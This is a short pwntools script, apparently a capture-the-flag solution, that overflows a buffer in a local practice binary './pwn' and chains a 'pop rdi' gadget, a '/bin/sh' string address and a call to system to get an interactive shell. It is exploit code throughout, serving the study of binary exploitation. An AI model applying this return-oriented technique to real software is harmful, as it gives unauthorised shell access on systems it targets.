#!/bin/python3

from pwn import *

p = process('./pwn')
e = ELF('./pwn')
r = ROP('./pwn')

offset = 0x7ffc5fc4d748 - 0x7ffc5fc4d720

payload = b'A'*offset

# we want to pop the "/bin/sh" string into rdi to be used as a param for system()
payload += p64(r.find_gadget(["pop rdi"]).address)

# the addr of "/bin/sh" string 
payload += p64(e.sym['whatsThis'])

# where `system` is called in soClose()
payload += p64(e.sym['soClose'] + 19) # you could also use e.plt['system'] 

p.sendline(payload)

p.interactive()